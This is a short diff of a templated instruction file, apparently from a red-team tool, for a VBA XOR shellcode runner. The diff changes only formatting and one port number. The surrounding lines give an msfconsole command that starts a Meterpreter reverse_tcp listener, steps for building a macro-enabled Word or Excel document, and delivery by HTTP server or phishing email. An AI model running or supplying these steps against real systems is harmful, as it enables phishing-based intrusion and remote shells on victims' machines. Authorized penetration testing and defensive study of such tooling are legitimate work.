@@ -111,7 +111,7 @@ output:
     VBA Simple XOR Shellcode Runner - Launch Instructions
 
     Start Listener:
-    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
     Create Office Document:
     {% if office_app == "word" %}1. Create new Word document
@@ -125,7 +125,7 @@ output:
     5. Save as .xlsm (Macro-Enabled) or .xls (97-2003){% endif %}
 
     Transfer Document:
-    python3 -m http.server 8080
+    $ python3 -m http.server 80
     Or via phishing email attachment
 
     Execute:
@@ -181,7 +181,7 @@ output:
     Cleanup:
 
     After testing, delete the document:
-    Remove-Item document.docm -Force
+    $ Remove-Item document.docm -Force
 
     Security Note:
 
